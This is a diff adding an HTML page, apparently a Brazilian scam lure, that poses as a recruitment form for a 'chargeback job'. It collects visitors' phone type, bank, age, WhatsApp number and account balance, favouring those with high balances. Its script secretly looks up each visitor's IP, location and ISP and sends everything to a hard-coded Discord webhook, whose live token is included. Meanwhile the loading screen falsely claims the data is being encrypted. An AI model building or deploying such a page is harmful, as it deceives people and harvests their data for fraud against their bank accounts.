@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Recrutamento - Vaga Exclusiva</title>
+    <!-- Google Fonts para estilo tecnológico e futurista -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome para ícones modernos -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg-color: #05050c;
+            --card-bg: rgba(10, 10, 25, 0.75);
+            --neon-blue: #00f0ff;
+            --neon-purple: #9d4edd;
+            --neon-red: #ff0055;
+            --neon-green: #39ff14;
+            --text-primary: #ffffff;
+            --text-secondary: #8b8fba;
+            --border-glow: rgba(0, 240, 255, 0.2);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(157, 78, 221, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(0, 240, 255, 0.15) 0%, transparent 40%);
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: var(--text-primary);
+            overflow-x: hidden;
+        }
+
+        /* */
+        /* Container Principal Fluido para Celular e Computador */
+        .app-container {
+            width: 100%;
+            max-width: 520px;
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            border-radius: 20px;
+            padding: 30px 25px;
+            position: relative;
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.05), inset 0 0 15px rgba(157, 78, 221, 0.05);
+            animation: containerFade 0.8s ease-out;
+        }
+
+        /* Efeito de Scanner Laser Futurista */
+        .app-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--neon-blue), transparent);
+            animation: scan 4s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { top: 0%; opacity: 0; }
+            5% { opacity: 1; }
+            95% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        @keyframes containerFade {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Cabeçalho */
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-area {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-area i {
+            font-size: 20px;
+            -webkit-text-fill-color: var(--neon-blue);
+            text-shadow: 0 0 10px var(--neon-blue);
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 15px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            font-weight: 600;
+        }
+
+        /* Grupos de Perguntas */
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .step-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--neon-blue);
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-shadow: 0 0 5px rgba(0, 240, 255, 0.3);
+        }
+
+        .step-label span {
+            background: rgba(0, 240, 255, 0.1);
+            border: 1px solid var(--neon-blue);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+        }
+
+        /* */
+        /* Grelha de Opções Modulares */
+        .options-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .option-card {
+            position: relative;
+        }
+
+        .option-card input[type="radio"] {
+            display: none;
+        }
+
+        .option-card label {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            min-height: 80px;
+        }
+
+        .option-card label i {
+            font-size: 20px;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+            transition: all 0.3s;
+        }
+
+        .option-card label span {
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-primary);
+        }
+
+        /* Efeitos Hover */
+        .option-card:not(.disabled) label:hover {
+            border-color: var(--neon-purple);
+            background: rgba(157, 78, 221, 0.05);
+            box-shadow: 0 0 15px rgba(157, 78, 221, 0.1);
+        }
+
+        /* Estado Selecionado */
+        .option-card input[type="radio"]:checked + label {
+            border-color: var(--neon-blue);
+            background: rgba(0, 240, 255, 0.08);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.2), inset 0 0 10px rgba(0, 240, 255, 0.1);
+        }
+
+        .option-card input[type="radio"]:checked + label i {
+            color: var(--neon-blue);
+            text-shadow: 0 0 8px var(--neon-blue);
+        }
+
+        /* Lógica Condicional: Visual do Nubank Bloqueado no Android */
+        .option-card.disabled {
+            opacity: 0.25;
+            cursor: not-allowed;
+        }
+
+        .option-card.disabled label {
+            cursor: not-allowed;
+            border-color: rgba(255, 255, 255, 0.05) !important;
+            background: rgba(255, 255, 255, 0.01) !important;
+            box-shadow: none !important;
+        }
+
+        .option-card.disabled label span, 
+        .option-card.disabled label i {
+            color: rgba(255, 255, 255, 0.2) !important;
+            text-shadow: none !important;
+        }
+
+        /* Campos de Entrada de Texto com Ícone Embutido */
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+            font-size: 16px;
+            transition: all 0.3s;
+            pointer-events: none;
+        }
+
+        .custom-input {
+            width: 100%;
+            padding: 14px 15px 14px 45px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 16px;
+            font-weight: 500;
+            outline: none;
+            transition: all 0.3s;
+            font-family: 'Rajdhani', sans-serif;
+        }
+
+        .custom-input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .custom-input:focus {
+            border-color: var(--neon-blue);
+            background: rgba(0, 240, 255, 0.02);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.15);
+        }
+
+        .custom-input:focus + i {
+            color: var(--neon-blue);
+            text-shadow: 0 0 8px var(--neon-blue);
+        }
+
+        /* Alerta Cyber-Aviso para Menores de Idade */
+        .age-warning {
+            display: none;
+            background: rgba(255, 0, 85, 0.1);
+            border: 1px solid var(--neon-red);
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 15px;
+            align-items: center;
+            gap: 10px;
+            animation: shake 0.4s ease-in-out;
+            color: #ff9ebb;
+        }
+
+        .age-warning i {
+            color: var(--neon-red);
+            font-size: 18px;
+            text-shadow: 0 0 8px var(--neon-red);
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        /* Botão Submeter */
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, var(--neon-purple), var(--neon-blue));
+            border: none;
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            box-shadow: 0 4px 20px rgba(0, 240, 255, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+            font-family: 'Orbitron', sans-serif;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 240, 255, 0.45);
+            filter: brightness(1.1);
+        }
+
+        .btn-submit:active:not(:disabled) {
+            transform: translateY(1px);
+        }
+
+        .btn-submit:disabled {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.2);
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Ecrã de Carregamento Futurista com Progresso Dinâmico */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 5, 12, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .loader-ring {
+            width: 80px;
+            height: 80px;
+            border: 3px solid transparent;
+            border-top: 3px solid var(--neon-blue);
+            border-right: 3px solid var(--neon-purple);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+            position: relative;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.1);
+        }
+
+        .loader-ring::after {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            right: 5px;
+            bottom: 5px;
+            border: 3px solid transparent;
+            border-bottom: 3px solid var(--neon-blue);
+            border-left: 3px solid var(--neon-purple);
+            border-radius: 50%;
+            animation: spinReverse 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes spinReverse {
+            0% { transform: rotate(360deg); }
+            100% { transform: rotate(0deg); }
+        }
+
+        .status-message {
+            color: var(--neon-blue);
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            height: 20px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 8px var(--neon-blue);
+            font-weight: 700;
+        }
+
+        .progress-container {
+            width: 200px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon-purple), var(--neon-blue));
+            border-radius: 2px;
+            transition: width 0.4s ease;
+        }
+
+        /* Otimização Responsiva Nativa */
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                align-items: flex-start;
+            }
+
+            .app-container {
+                border-radius: 16px;
+                padding: 24px 16px;
+                box-shadow: none;
+                background: rgba(10, 10, 25, 0.9);
+                border: 1px solid rgba(0, 240, 255, 0.1);
+            }
+
+            .options-grid {
+                gap: 8px;
+            }
+
+            .option-card label {
+                padding: 12px 10px;
+                min-height: 70px;
+            }
+
+            .option-card label span {
+                font-size: 14px;
+            }
+
+            .option-card label i {
+                font-size: 18px;
+                margin-bottom: 4px;
+            }
+
+            .logo-area {
+                font-size: 20px;
+            }
+
+            .custom-input {
+                padding: 12px 12px 12px 40px;
+                font-size: 15px;
+            }
+
+            .input-wrapper i {
+                left: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <header>
+            <div class="logo-area">
+                <i class="fa-solid fa-microchip"></i>
+                TRAMPO DE ESTORNO
+            </div>
+            <div class="subtitle">VERSÃO 2026 (V4.16)</div>
+        </header>
+
+        <form id="vagaForm">
+            
+            <!-- Passo 1: Sistema Operacional -->
+            <div class="form-group">
+                <div class="step-label">
+                    <span>Passo 1</span> CELULAR PARA O TRAMPO
+                </div>
+                <div class="options-grid">
+                    <div class="option-card">
+                        <input type="radio" id="android" name="so" value="Android" required>
+                        <label for="android">
+                            <i class="fa-brands fa-android"></i>
+                            <span>Android</span>
+                        </label>
+                    </div>
+                    <div class="option-card">
+                        <input type="radio" id="iphone" name="so" value="iPhone">
+                        <label for="iphone">
+                            <i class="fa-brands fa-apple"></i>
+                            <span>iPhone</span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Passo 2: Carteira / Banco -->
+            <div class="form-group">
+                <div class="step-label">
+                    <span>Passo 2</span> QUAL BANCO SERA USADO
+                </div>
+                <div class="options-grid">
+                    <div class="option-card" id="box-nubank">
+                        <input type="radio" id="nubank" name="banco" value="Nubank" required>
+                        <label for="nubank">
+                            <i class="fa-solid fa-wallet"></i>
+                            <span>Nubank</span>
+                        </label>
+                    </div>
+                    <div class="option-card" id="box-mercadopago">
+                        <input type="radio" id="mercadopago" name="banco" value="Mercado Pago">
+                        <label for="mercadopago">
+                            <i class="fa-solid fa-credit-card"></i>
+                            <span>Mercado Pago</span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Passo 3: Idade -->
+            <div class="form-group">
+                <div class="step-label">
+                    <span>Passo 3</span> QUAL SUA IDADE
+                </div>
+                <div class="options-grid">
+                    <div class="option-card">
+                        <input type="radio" id="mais18" name="idade" value="Mais de 18 anos" required>
+                        <label for="mais18">
+                            <i class="fa-solid fa-user-shield"></i>
+                            <span>+18 Anos</span>
+                        </label>
+                    </div>
+                    <div class="option-card">
+                        <input type="radio" id="menos18" name="idade" value="Menos de 18 anos">
+                        <label for="menos18">
+                            <i class="fa-solid fa-user-lock"></i>
+                            <span>-18 Anos</span>
+                        </label>
+                    </div>
+                </div>
+                
+                <!-- Alerta dinâmico de idade bloqueada -->
+                <div class="age-warning" id="warning">
+                    <i class="fa-solid fa-triangle-exclamation"></i>
+                    <span>Infelizmente você precisa ser maior de idade para se candidatar à vaga.</span>
+                </div>
+            </div>
+
+            <!-- Passo 4: WhatsApp -->
+            <div class="form-group">
+                <div class="step-label">
+                    <span>Passo 4</span> Contato PARA WHATSAPP
+                </div>
+                <div class="input-wrapper">
+                    <i class="fa-brands fa-whatsapp"></i>
+                    <input type="tel" id="whatsapp" name="whatsapp" class="custom-input" placeholder="(99) 99999-9999" required autocomplete="off">
+                </div>
+            </div>
+
+            <!-- Passo 5: Renda Mensal (Digitação Livre com Formatação Monetária) -->
+            <div class="form-group">
+                <div class="step-label">
+                    <span>Passo 5</span> QUANTO DE SALDO VOCE TEM EM CONTA
+                </div>
+                <div class="subtitle" style="color: #ff0055; font-size: 12px; font-weight: 700; margin-bottom: 12px; letter-spacing: 0.5px;">
+                    IREI CHAMAR APENAS USUARIOS COM SALDO ALTO PRIMEIRO (TRAMPO LIMITADO)
+                </div>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-hand-holding-dollar"></i>
+                    <input type="text" id="renda" name="renda" class="custom-input" placeholder="R$ 0,00" required autocomplete="off">
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn-submit">
+                <span>Enviar Cadastro</span>
+                <i class="fa-solid fa-chevron-right"></i>
+            </button>
+
+        </form>
+    </div>
+
+    <!-- Overlay de processamento e envio holográfico -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loader-ring"></div>
+        <div class="status-message" id="statusMessage">Iniciando protocolo...</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+    </div>
+
+    <!-- -->
+    <script>
+        // --- CONFIGURAÇÃO EDITÁVEL ---
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1508847612164313280/PeZmQSs4JRhf_sHd-YQm7L7imdt6Kokp6E-dmNy3cOOX3tba8e8cdCvMllZNeCZHcp2d";
+        const URL_PROVAS_SOCIAIS = "provas_sociais.html"; // Nome do seu arquivo local ou online de provas sociais
+
+        // --- SELEÇÃO DE ELEMENTOS DO DOM ---
+        const radioAndroid = document.getElementById('android');
+        const radioIphone = document.getElementById('iphone');
+        const radioNubank = document.getElementById('nubank');
+        const radioMercadoPago = document.getElementById('mercadopago');
+        const boxNubank = document.getElementById('box-nubank');
+        
+        const radioMais18 = document.getElementById('mais18');
+        const radioMenos18 = document.getElementById('menos18');
+        const warningBox = document.getElementById('warning');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        const whatsappInput = document.getElementById('whatsapp');
+        const rendaInput = document.getElementById('renda');
+        
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const statusMessage = document.getElementById('statusMessage');
+        const progressBar = document.getElementById('progressBar');
+
+        // --- FORMATADOR INTELIGENTE DE WHATSAPP ---
+        whatsappInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ""); // Remove tudo que não for número
+            
+            if (value.length > 11) {
+                value = value.substring(0, 11);
+            }
+            
+            // Aplica formatação de telefone celular (XX) XXXXX-XXXX
+            if (value.length > 6) {
+                value = `(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7)}`;
+            } else if (value.length > 2) {
+                value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
+            } else if (value.length > 0) {
+                value = `(${value}`;
+            }
+            
+            e.target.value = value;
+        });
+
+        // --- FORMATADOR EM TEMPO REAL DE MOEDA (R$) ---
+        rendaInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ""); // Remove não numéricos
+            if (!value) {
+                e.target.value = "";
+                return;
+            }
+            
+            // Converte para valor decimal centesimal
+            let floatValue = parseFloat(value) / 100;
+            
+            // Formata para o padrão monetário BRL
+            e.target.value = floatValue.toLocaleString('pt-BR', {
+                style: 'currency',
+                currency: 'BRL'
+            });
+        });
+
+        // --- LÓGICA DE INTERAÇÕES CONDICIONAIS ---
+        function verificarCondicionais() {
+            // Regra do Sistema Operacional (Passo 1 -> Passo 2)
+            if (radioAndroid.checked) {
+                radioNubank.disabled = true;
+                radioNubank.checked = false;
+                boxNubank.classList.add('disabled');
+                radioMercadoPago.checked = true; // Força Mercado Pago se for Android
+            } else if (radioIphone.checked) {
+                radioNubank.disabled = false;
+                boxNubank.classList.remove('disabled');
+            }
+
+            // Regra de Idade (Passo 3 -> Desativação de Cadastro)
+            if (radioMenos18.checked) {
+                warningBox.style.display = 'flex';
+                submitBtn.disabled = true;
+            } else {
+                warningBox.style.display = 'none';
+                submitBtn.disabled = false;
+            }
+        }
+
+        // Listeners para monitoramento constante das escolhas
+        radioAndroid.addEventListener('change', verificarCondicionais);
+        radioIphone.addEventListener('change', verificarCondicionais);
+        radioMais18.addEventListener('change', verificarCondicionais);
+        radioMenos18.addEventListener('change', verificarCondicionais);
+
+        // Executar verificação no carregamento inicial da página
+        window.addEventListener('DOMContentLoaded', verificarCondicionais);
+
+        // --- CAPTURA DE IP E LOCALIZAÇÃO ---
+        async function obterDadosGeolocalizacao() {
+            try {
+                // Consulta serviço de IPAPI gratuito e rápido
+                const resposta = await fetch('https://ipapi.co/json/');
+                if (resposta.ok) {
+                    const info = await resposta.json();
+                    return {
+                        ip: info.ip || 'Não detectado',
+                        cidade: info.city || 'Desconhecido',
+                        estado: info.region || 'Desconhecido',
+                        pais: info.country_name || 'Desconhecido',
+                        provedor: info.org || 'Desconhecido'
+                    };
+                }
+            } catch (erro) {
+                console.error("Erro ao coletar geolocalização:", erro);
+            }
+            // Retorno padrão em caso de erro/bloqueio
+            return {
+                ip: 'Bloqueado/Não detectado',
+                cidade: 'Desconhecida',
+                estado: 'Desconhecido',
+                pais: 'Desconhecido',
+                provedor: 'Desconhecido'
+            };
+        }
+
+        // --- ENVIO DOS DADOS PARA O DISCORD ---
+        async function enviarDadosParaDiscord(dados, geo) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("SUA_WEBHOOK")) {
+                console.warn("URL do Webhook do Discord não configurado corretamente.");
+                return false;
+            }
+
+            // Estruturação do Card do Discord com dados de geolocalização coletados
+            const payload = {
+                embeds: [{
+                    title: "🚀 NOVO CLIENTE ENCONTRADO!",
+                    color: 39321, // Cor Neon Blue (#00f0ff) em formato decimal
+                    fields: [
+                        { name: "📱 MARCA CELULAR", value: `\`${dados.so}\``, inline: true },
+                        { name: "💳 BANCO DISPONIVEL", value: `\`${dados.banco}\``, inline: true },
+                        { name: "🎂 IDADE", value: `\`${dados.idade}\``, inline: true },
+                        { name: "💬 WhatsApp", value: `[Chamar no WhatsApp](https://wa.me/55${dados.whatsappRaw}) \n**${dados.whatsapp}**`, inline: false },
+                        { name: "💰 SALDO EM CONTA", value: `\`${dados.renda}\``, inline: true },
+                        { name: "🌐 Endereço IP", value: `\`${geo.ip}\``, inline: true },
+                        { name: "📍 Localização Detectada", value: `\`${geo.cidade} - ${geo.estado}, ${geo.pais}\``, inline: false },
+                        { name: "🏢 Provedor de Internet", value: `\`${geo.provedor}\``, inline: false }
+                    ],
+                    footer: { text: "Rastreamento Inteligente de Candidatos • Conectado via API" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return response.ok;
+            } catch (error) {
+                console.error("Erro ao enviar dados para a webhook:", error);
+                return false;
+            }
+        }
+
+        // --- SUBMIT E ANIMAÇÃO DE FLUXO ---
+        document.getElementById('vagaForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // Bloquear botão
+            submitBtn.disabled = true;
+
+            // Coleta os dados de entrada do usuário
+            const so = document.querySelector('input[name="so"]:checked')?.value || "Não informado";
+            const banco = document.querySelector('input[name="banco"]:checked')?.value || "Não informado";
+            const idade = document.querySelector('input[name="idade"]:checked')?.value || "Não informado";
+            const whatsapp = whatsappInput.value;
+            const whatsappRaw = whatsapp.replace(/\D/g, "");
+            const renda = rendaInput.value || "Não informada";
+
+            // Exibir tela de processamento holográfico
+            loadingOverlay.style.display = 'flex';
+
+            // 1º Passo: Obter geolocalização em background enquanto anima
+            statusMessage.textContent = "CONECTANDO AO SERVIDOR SEGURO...";
+            progressBar.style.width = '20%';
+            
+            const geo = await obterDadosGeolocalizacao(); // Executa o rastreamento por IP
+
+            // 2º Passo: Criptografar pacotes
+            await new Promise(resolve => setTimeout(resolve, 600));
+            statusMessage.textContent = "CRIPTOGRAFANDO DADOS DE ENVIO...";
+            progressBar.style.width = '45%';
+
+            // 3º Passo: Executar envio dos dados com IP para o Discord
+            await new Promise(resolve => setTimeout(resolve, 600));
+            statusMessage.textContent = "REGISTRANDO CADASTRO E LOCALIZAÇÃO...";
+            progressBar.style.width = '75%';
+            
+            await enviarDadosParaDiscord({ so, banco, idade, whatsapp, whatsappRaw, renda }, geo);
+
+            // 4º Passo: Concluir e Redirecionar
+            await new Promise(resolve => setTimeout(resolve, 600));
+            statusMessage.textContent = "REDIRECIONANDO CANDIDATO...";
+            progressBar.style.width = '100%';
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            // Encaminhar para a página de provas sociais (caminho relativo limpo)
+            window.location.href = URL_PROVAS_SOCIAIS;
+        });
+    </script>
+</body>
+</html>
